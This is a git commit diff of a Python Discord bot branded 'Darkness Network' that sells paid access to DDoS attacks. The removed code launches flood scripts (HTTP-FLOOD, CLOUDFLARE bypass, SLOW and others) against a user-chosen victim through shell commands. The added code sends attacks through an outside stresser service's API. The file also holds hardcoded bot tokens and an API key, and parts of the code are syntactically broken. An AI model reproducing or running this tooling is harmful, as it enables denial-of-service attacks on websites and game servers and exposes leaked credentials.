3cce7ebf20b9482f2fd6e38c081e085049226c1d
thegodofdarknes <144856804+thegodofdarknes@users.noreply.github.com>
2024-01-19 10:40:14 -0600

    Add files via upload

--- bot.py
+++ bot.py
@@ -1,221 +1,193 @@
-__author__ = 'Darkness'
-__version__ = '666.6'
-__github__ = 'github.com/TheDarkness'
-__license__ = 'GNU General Public License v6.66'
-# DarkBot | Discord DDos Bot v6.6 |  DarknessTheGod
-#=====Import Module=====#
-
- 
+# =====Import Module=====#
 
 import os
-try:
-        import discord
-except ImportError:
-        os.system("pip install discord")
-try:
-        import colorama
-except ImportError:
-        os.system("pip install colorama")
-from discord.ext import commands    
-from discord.ext.commands import Bot 
-from os import system        
-from os import name                  
-from colorama import *                                                
-import random, datetime, discord                        
-#=====User && Methods Setting=====#
-buyers  = [1141615067075461131]  #          
-admins  = [1141615067075461131]  #   ID users          
-owners  = [1141615067075461131]  #          
-methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UDP-BYPASS','SLOW'] # Methods
-year_now= datetime.datetime.now().strftime("%Y")     
-token   = 'MTE4NjMyNDQxNTMzNjY5Nzg5Nw.Gx42MF.HPejEnGqAEEyQmTQg1qQHmisEqTVxdnssEFzeA' # paste your token here
+import discord
+from discord.ext import commands
+from discord.ext.commands import Bot
+from os import system
+from os import name
+from colorama import *
+import random
+import datetime
+import requests
+import aiohttp
+
+# =====User && Methods Setting=====#
+buyers = [1141615067075461131]  # ID users
+admins = [1141615067075461131]  # ID users
+owners = [1141615067075461131]  # ID users
+
+l4methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET', 'CLOUDFLARE', 'UDP-BYPASS', 'SLOW']
+l7methods = ['TLSv2', 'HTTP-GOV', 'WEB-PROXIE']
+gmethods = ['GAME', 'FIVEM', 'FN']
+
+api_data = [
+    {
+        'api_url':'https://api.nightmarestresser.net/?key=',
+        'api_key':'576364-GwGtzpU6GmNt8Jgzf1kU9OAikLrKfTor&method=[METHOD]&host=[HOST]&port=[PORT]&time=[TIME]',
+        'max_time':'60'
+    }
+]
+
+year_now = datetime.datetime.now().strftime("%Y")
+
+#=====INITILIZE====================#
+token = 'MTE4NjMyNDQxNTMzNjY5Nzg5Nw.GLLx8W.DKjsMWPwJCzdrz-FySPf6e9fVhKH89u9SfM0aE'  # paste your token here
 intents = discord.Intents.default()
 intents.members = True
 intents.message_content = True
 intents.messages = True
-intents.dm_messages = True       
-bot     = commands.Bot(command_prefix='.', intents=intents)
-bot.remove_command("help")    
-#=====Random Color=====#
+intents.dm_messages = True
+bot = commands.Bot(command_prefix='.', intents=intents)
+bot.remove_command("help")
+
+# =====Random Color=====#
 async def random_color():
     number_lol = random.randint(1, 999999)
     while len(str(number_lol)) != 6:
         number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
     return number_lol
-#=====Bot Command=====#
+
+# =====Bot Command=====#
 @bot.command()
 async def help(ctx):
-        embed = discord.Embed(title="Darkness Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
-        embed.add_field(name = "**All Methods**", value = f"```yaml\nHTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUDP-BYPASS\nSLOW```")
-        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <thread> <time>```")
-        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Darkness Network.")
-        embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network")
-        await ctx.send(embed=embed)
+    embed = discord.Embed(title="Darkness Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}",
+                          color=await random_color())
+    embed.add_field(name="**Syntax**", value="```md\n.ddos <method> <target> <port> <time>```")
+    embed.add_field(name="**HELP**", value="```.hit to view methods```")
+    embed.add_field(name="**NOTE**", value="> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Darkness Network.")
+    embed.set_footer(text=f"©{year_now} Copyright Of Darkness Network")
+    await ctx.send(embed=embed)
+
 @bot.command()
-async def add_buyer(ctx, buyer : int = None):
+async def add_buyer(ctx, buyer: int = None):
     if ctx.author.id not in admins:
         await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')
-
     elif buyer in buyers:
         await ctx.send(f'{buyer} has already copped a spot!')
-
     elif buyer is None:
         await ctx.send('Please give a buyer!!')
-
-
     else:
         buyers.append(buyer)
         await ctx.send('Added him/her!!')
 
 @bot.command()
-async def delete_buyer(ctx, buyer : int = None):
+async def delete_buyer(ctx, buyer: int = None):
     if ctx.author.id not in admins:
         await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')
-
     elif buyer not in buyers:
         await ctx.send(f'{buyer} did not cop a spot!')
-
     elif buyer is None:
         await ctx.send('Please give a buyer!!')
-
     else:
         buyers.remove(buyer)
         await ctx.send('Removed him/her!!')
-        
+
 @bot.command()
-async def add_admin(ctx, admin : int = None):
+async def add_admin(ctx, admin: int = None):
     if ctx.author.id not in owners:
         await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')
-
     elif admin in admins:
         await ctx.send(f'{admin} is already an admin!')
-
     elif admin is None:
         await ctx.send('Please give an admin!!')
-
     else:
         admins.append(admin)
         await ctx.send('Added him/her!!')
 
 @bot.command()
-async def delete_admin(ctx, admin : int = None):
+async def delete_admin(ctx, admin: int = None):
     if ctx.author.id not in owners:
         await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')
-
     elif admin not in admins:
         await ctx.send(f'{admin} is not an admin')
-
     elif admin is None:
         await ctx.send('Please give an admin!!')
-
     else:
         admins.remove(admin)
         await ctx.send('Removed him/her!!')
 
 @bot.command()
-async def ddos(ctx, method : str = None, victim : str = None, thread : str = None, time : str = None):
-    if ctx.author.id not in buyers: 
-        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
-        await ctx.send(embed=embed)
-    else:
-        if method is None:
-            embed = discord.Embed(title=f"Error!", description=f"You need a method! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif method.upper() not in methods:
-            embed = discord.Embed(title="Error!", description=f"Invalid method!! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif victim is None:
-             embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif thread is None:
-            embed = discord.Embed(title="Error!", description=f"You need a thread! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        elif time is None:
-            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
-            await ctx.send(embed=embed)
-        else:
-                max_time = int(300)
-                max_thread = int(50000)
-                if int(time) > max_time:
-                    time2 = max_time
-                else:
-                    time2 = int(time)
-                if int(thread) > max_thread:
-                    thread2 = max_thread
-                else:
-                    thread2 = int(thread)
-                if method == 'HTTP-FLOOD':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
-                elif method == 'HTTP-RAW':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'node HTTP-RAW.js {victim} {time2}')
-                elif method == 'HTTP-RAND':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'node HTTP-RAND.js {victim} {time2}')
-                elif method == 'HTTP-SOCKET':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
-                elif method == 'CLOUDFLARE':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'node cf.js {victim} {time2} {thread2}')
-                elif method == 'UDP-BYPASS':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'node uambypass.js {victim} {time2} 2000 http.txt')
-                elif method == 'SLOW':
-                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
-                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
-                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
-                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
-                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
-                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Of Darkness Network.")
-                    await ctx.send(embed=embed)
-                    system(f'node slow.js {victim} {time2}')
+async def hit(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
+    if ctx.author.id not in buyers: # They didn't buy the bot!!
+        await ctx.send('Sorry, but you need to buy a spot!')
 
-           
+    else:
+        if method is None or method.upper() == 'methods':
+            l4methodstr = ''
+            l7methodstr = ''
+            gmethodstr = ''
+            for m in l4methods:
+                l4methodstr = f'{l4methodstr}{m}\n'
+
+            for m2 in l7methods:
+                l7methodstr = f'{l7methodstr}{m2}\n'
+
+            for m3 in gmethods:
+                gmethodstr = f'{gmethodstr}{m3}\n'
+                
+            embed = discord.Embed(title="METHOD LIST", description="---------------------------------------------")
+            embed.add_field(name="Layer 4:", value=f"{l4methodstr}", inline=False)
+            embed.add_field(name="Game Methods:", value=f"{gmethodstr}", inline=True)
+            embed.add_field(name="Layer 7:", value=f"{l7methodstr}", inline=False)
+
+            await ctx.send(embed=embed)
+
+        # There was no method
+        elif method is None:
+            await ctx.send('You need a method!')
+            
+        # The method was invalid!
+        elif method.upper() not in l4methods and method.upper() not in l7methods and method.upper() not in gmethods:
+            await ctx.send(f'Invalid method!!')
+
+        # There was no victim
+        elif victim is None:
+            await ctx.send('You need a target!')
+
+        # There was no port
+        elif port is None:
+            await ctx.send('You need a port!')
+
+        # There was no time
+        elif time is None:
+            await ctx.send('You need a time!')
+
+        # Everything is correct!
+        else:
+            for i in api_data:
+                try:
+                    api_url = i["api_url"]
+                    api_key = i["api_key"]
+                    max_time = int(i["max_time"])
+
+                    if int(time) > max_time:
+                        time2 = max_time
+
+                    else:
+                        time2 = int(time)
+
+                    async with aiohttp.ClientSession() as session:
+                        replace1 = api_key.replace("[host]", victim)
+                        replace2 = replace1.replace("[port]", port)
+                        replace3 = replace2.replace("[time]", time)
+                        replace4 = replace3.replace("[method]", method)
+                        await session.get(f'{api_url}{replace4}')
+                except Exception as e:
+                    embed = discord.Embed(title="Made By Sysk3y", description=f"")
+                    await ctx.send(embed=embed)
+                    pass
+
+            embed = discord.Embed(title="ATTACK SENT SUCCESSFUL", description=f"")            
+            embed2 = discord.Embed(color=0x9b59b6)
+            embed.add_field(name="------------------------------------------------", value="", inline=False)
+            embed.add_field(name=f"VICTIM: ``{victim}``", value=f"", inline=False)
+            embed.add_field(name=f"PORT: ``{port}``", value=f"", inline=False)
+            embed.add_field(name=f"TIME: ``{time}``", value=f"", inline=False)
+            embed.add_field(name=f"METHOD: ``{method}``", value=f"", inline=False)
+            embed.add_field(name="------------------------------------------------", value="", inline=False)
+            embed.set_footer(text='- Made By WHT SEC')
+
 
 @bot.event
 async def on_ready():
@@ -253,15 +225,22 @@ async def on_ready():
         system('cls')
     else:
         system('clear')
-    print(banner)
-    print('\033[1;97m+=============================================================+')
-    print(f'\033[1;97m|Logged \033[1;96m{bot.user.name}                                  |')
-    print(f'\033[1;97m|Bot ID: \033[1;97m{bot.user.id}                                  |')
-    print('\033[1;97m+=============================================================+')
+    async def on_ready():
+    print('╔════════════════════════════════════════╗')
+    print('║            Bot Information             ║')
+    print('╠════════════════════════════════════════╣')
+    print('║             Bot Username:              ║')
+    print(f'║            [+] {bot.user.name} [+]             ║')
+    print('║                                        ║')
+    print('║            Disnake Version:            ║')
+    print(f'║             [+] {discord.__version__} [+]              ║')
+    print('╚════════════════════════════════════════╝')
+    print('')
+    
+    await bot.change_presence(activity=discord.Game(name="/help"))
     if str(len(bot.guilds)) == 1:
         await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
     else:
         await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
 if __name__ == '__main__':
-    init(convert=True)
     bot.run(token)
